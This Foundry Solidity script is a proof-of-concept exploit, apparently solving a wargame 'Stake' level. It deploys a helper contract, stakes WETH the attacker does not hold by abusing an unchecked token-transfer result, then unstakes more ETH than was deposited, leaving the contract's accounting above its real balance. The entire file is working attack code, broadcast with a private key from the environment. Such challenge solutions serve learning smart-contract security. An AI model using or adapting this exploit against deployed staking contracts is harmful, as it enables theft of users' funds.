// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {BecauseWhyNot} from "../src/31_Stake.sol";

interface IStake {
    function totalStaked() external view returns (uint256);

    function WETH() external view returns (address);

    function StakeETH() external payable;

    function StakeWETH(uint256 amount) external returns (bool);

    function Unstake(uint256 amount) external returns (bool);
}

interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract PoC is Script {
    IStake private immutable stake =
        IStake(0xaF162C29cf1791410b601D4CB73292c78C42320D); // Replace with your Stake instance
    IWETH private immutable weth = IWETH(stake.WETH());
    uint256 amount = 0.001 ether + 1 wei;

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        // 1. Deploy the BecauseWhyNot contract and stake some ETH
        BecauseWhyNot becauseWhyNot = new BecauseWhyNot(address(stake));
        becauseWhyNot.becauseWhyNot{value: amount + 1 wei}();

        // 2. Become a staker with minimum amount
        stake.StakeETH{value: amount}();

        // 3. Approve the stake contract to use WETH
        weth.approve(address(stake), amount);

        // 4. Stake WETH (that we don't have!)
        stake.StakeWETH(amount);
        console2.log("Balance after StakeWETH: ", address(stake).balance);
        console2.log("TotalStaked after StakeWETH: ", stake.totalStaked());

        // 5. Unstake ETH + WETH (leave 1 wei in Stake contract)
        stake.Unstake(amount * 2);
        console2.log("Balance after hack: ", address(stake).balance);
        console2.log("TotalStaked after hack: ", stake.totalStaked());

        require(address(stake).balance > 0, "Stake balance == 0");
        require(
            stake.totalStaked() > address(stake).balance,
            "Balance > Total staked"
        );

        vm.stopBroadcast();
    }
}
